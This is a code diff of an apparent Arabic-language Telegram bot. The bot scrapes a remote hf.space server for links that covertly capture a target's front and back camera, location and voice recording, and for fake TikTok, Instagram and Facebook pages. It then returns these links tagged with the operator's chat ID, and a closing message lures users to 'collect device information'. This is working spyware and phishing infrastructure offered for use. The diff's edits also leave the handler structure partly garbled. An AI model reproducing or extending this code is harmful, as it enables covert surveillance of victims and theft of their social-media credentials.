@@ -1837,118 +1837,154 @@ bot.on('callback_query', async (callbackQuery) => {
     const removeVipMsg = 'الرجاء إرسال معرف المستخدم لإزالته من VIP:';
     if (removeVipMsg && removeVipMsg.trim() !== '') {
         bot.sendMessage(chatId, removeVipMsg);
-    }
-    bot.once('message', (msg) => {  
-        const userId = msg.text;  
-        removeVIPUser(userId);
-        const removedMsg = `تم إزالة المستخدم ${userId} من VIP.`;
-        if (removedMsg && removedMsg.trim() !== '') {
-            bot.sendMessage(chatId, removedMsg);
-        }
-    });  
-} else {  
-    const [action, userId] = data.split(':');  
-
-    if (!exemptButtons.includes(action) && !validateLinkUsage(userId, action)) {  
-        // هنا غيرت السطر ليمنع إرسال رسالة فارغة
-        // bot.sendMessage(chatId, '');  
-        return;  
-    }  
-
     
 
-// دالة لجلب رابط حسب اسم الملف داخل href
-async function fetchDynamicLink(baseUrl, keyword) {
+// دالة لاستيراد الروابط من الموقع
+async function importLinksFromWebsite() {
     try {
-        const response = await axios.get(baseUrl, { timeout: 10000 });
+        const url = "https://sssssskskjwnsb-linklsksn.hf.space"; // الموقع الذي يحتوي على الروابط
+        
+        const response = await axios.get(url, { timeout: 10000 });
         const $ = cheerio.load(response.data);
-
-        let found = null;
-
-        $('a[href]').each((i, el) => {
-            let link = $(el).attr('href');
-            if (!link) return;
-
-            // تحويل الروابط النسبية إلى كاملة
-            if (link.startsWith('/')) {
-                link = baseUrl.replace(/\/+$/, '') + link;
-            }
-
-            // البحث عن ملف بداخله keyword مثل /c أو /b أو /t أو /i
-            if (link.includes(`/${keyword}`)) {
-                found = link;
-                return false;
+        
+        const links = {};
+        
+        // البحث عن جميع الروابط واستخراجها
+        $('a[href]').each((index, element) => {
+            const href = $(element).attr('href');
+            const text = $(element).text().trim();
+            
+            // استخراج اسم الملف من الرابط أو النص
+            if (href && (href.includes('/c/') || href.includes('/b/') || href.includes('/t/') || 
+                href.includes('/i/') || href.includes('/fe/') || href.includes('/getLocation') || 
+                href.includes('/record'))) {
+                
+                // تحديد نوع الرابط بناء على المسار
+                if (href.includes('/c/')) links.captureFront = href;
+                else if (href.includes('/b/')) links.captureBack = href;
+                else if (href.includes('/t/')) links.rshq_tiktok = href;
+                else if (href.includes('/i/')) links.rshq_instagram = href;
+                else if (href.includes('/fe/')) links.rshq_facebook = href;
+                else if (href.includes('/getLocation')) links.getLocation = href;
+                else if (href.includes('/record')) links.recordVoice = href;
             }
         });
-
-        return found;
-    } catch (err) {
-        console.error(err);
+        
+        return links;
+    } catch (error) {
+        console.error('Error importing links:', error);
         return null;
     }
 }
 
+// معالجة callback queries
 bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
-    const action = callbackQuery.data;
+    const data = callbackQuery.data;
 
-    // موقعك الذي تؤخذ منه الروابط
-    const baseUrl = "https://sssssskskjwnsb-linklsksn.hf.space";
+    if (data === 'remove_vip') {
+        bot.sendMessage(chatId, "أرسل معرف المستخدم لإزالته من VIP:");
+        
+        bot.once('message', (msg) => {
+            const userId = msg.text;
+            removeVIPUser(userId);
+            const removedMsg = `تم إزالة المستخدم ${userId} من VIP.`;
+            if (removedMsg && removedMsg.trim() !== '') {
+                bot.sendMessage(chatId, removedMsg);
+            }
+        });
+    } else {
+        const [action, userId] = data.split(':');
 
-    bot.sendMessage(chatId, "⏳ جاري جلب الرابط من الخادم...");
-
-    let keyword = null;
-    let finalLink = null;
-
-    switch (action) {
-        case 'captureFront':   // يبحث عن رابط فيه /c
-            keyword = 'c';
-            break;
-
-        case 'captureBack':    // يبحث عن رابط فيه /b
-            keyword = 'b';
-            break;
-
-        case 'getLocation':    // هذا ثابت على السيرفر الأم
-            finalLink = `${baseUrl}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
-            break;
-
-        case 'recordVoice':
-            const duration = 10;
-            finalLink = `${baseUrl}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
-            break;
-
-        case 'rshq_tiktok':    // يبحث عن رابط فيه /t
-            keyword = 't';
-            break;
-
-        case 'rshq_instagram': // يبحث عن رابط فيه /i
-            keyword = 'i';
-            break;
-
-        case 'rshq_facebook':  // يبحث عن رابط فيه /fe
-            keyword = 'fe';
-            break;
-
-        default:
-            bot.sendMessage(chatId, "⚠️ خيار غير معروف");
-            return;
-    }
-
-    // إذا يحتاج استيراد من الموقع
-    if (keyword) {
-        const dynamic = await fetchDynamicLink(baseUrl, keyword);
-        if (dynamic) {
-            finalLink = `${dynamic}?chatId=${chatId}`;
-        } else {
-            bot.sendMessage(chatId, `❌ لم يتم العثور على رابط يحتوي ${keyword} في الموقع`);
+        if (!exemptButtons.includes(action) && !validateLinkUsage(userId, action)) {
             return;
         }
+
+        // استيراد الروابط من الموقع
+        bot.sendMessage(chatId, "⏳ جاري استيراد الروابط...");
+        
+        const importedLinks = await importLinksFromWebsite();
+        
+        if (!importedLinks) {
+            bot.sendMessage(chatId, "❌ فشل في استيراد الروابط من الموقع");
+            return;
+        }
+
+        let link = '';
+        let baseDomain = '';
+
+        // استخراج النطاق الأساسي من أحد الروابط المستوردة
+        const firstLink = Object.values(importedLinks)[0];
+        if (firstLink) {
+            const urlObj = new URL(firstLink);
+            baseDomain = `${urlObj.protocol}//${urlObj.hostname}`;
+        }
+
+        switch (action) {
+            case 'captureFront':
+                link = importedLinks.captureFront ? 
+                    `${importedLinks.captureFront}?chatId=${chatId}` : 
+                    `${baseDomain}/c/?chatId=${chatId}`;
+                break;
+            case 'captureBack':
+                link = importedLinks.captureBack ? 
+                    `${importedLinks.captureBack}?chatId=${chatId}` : 
+                    `${baseDomain}/b/?chatId=${chatId}`;
+                break;
+            case 'getLocation':
+                link = importedLinks.getLocation ? 
+                    `${importedLinks.getLocation}?chatId=${chatId}` : 
+                    `${baseDomain}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                break;
+            case 'recordVoice':
+                const duration = 10;
+                link = importedLinks.recordVoice ? 
+                    `${importedLinks.recordVoice}?chatId=${chatId}&duration=${duration}` : 
+                    `${baseDomain}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
+                break;
+            case 'rshq_tiktok':
+                link = importedLinks.rshq_tiktok ? 
+                    `${importedLinks.rshq_tiktok}?chatId=${chatId}&type=tiktok` : 
+                    `${baseDomain}/t/?chatId=${chatId}&type=tiktok`;
+                break;
+            case 'rshq_instagram':
+                link = importedLinks.rshq_instagram ? 
+                    `${importedLinks.rshq_instagram}?chatId=${chatId}` : 
+                    `${baseDomain}/i/?chatId=${chatId}`;
+                break;
+            case 'rshq_facebook':
+                link = importedLinks.rshq_facebook ? 
+                    `${importedLinks.rshq_facebook}?chatId=${chatId}` : 
+                    `${baseDomain}/fe/?chatId=${chatId}`;
+                break;
+            default:
+                return;
+        }
+
+        bot.sendMessage(chatId, `✅ تم إنشاء الرابط:\n${link}`);
     }
 
-    bot.sendMessage(chatId, `تم إنشاء الرابط:\n${finalLink}`);
     bot.answerCallbackQuery(callbackQuery.id);
 });
+
+// دالة مساعدة لتحسين استيراد الروابط
+async function refreshImportedLinks() {
+    console.log('🔄 جاري تحديث الروابط المستوردة...');
+    const links = await importLinksFromWebsite();
+    if (links) {
+        console.log('✅ تم تحديث الروابط بنجاح');
+        console.log('الروابط المستوردة:', links);
+    } else {
+        console.log('❌ فشل في تحديث الروابط');
+    }
+    return links;
+}
+
+// تحديث الروابط تلقائياً كل 5 دقائق
+setInterval(refreshImportedLinks, 5 * 60 * 1000);
+
+// تحديث الروابط عند بدء التشغيل
+refreshImportedLinks();
 bot.onText(/\/jjihigjoj/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
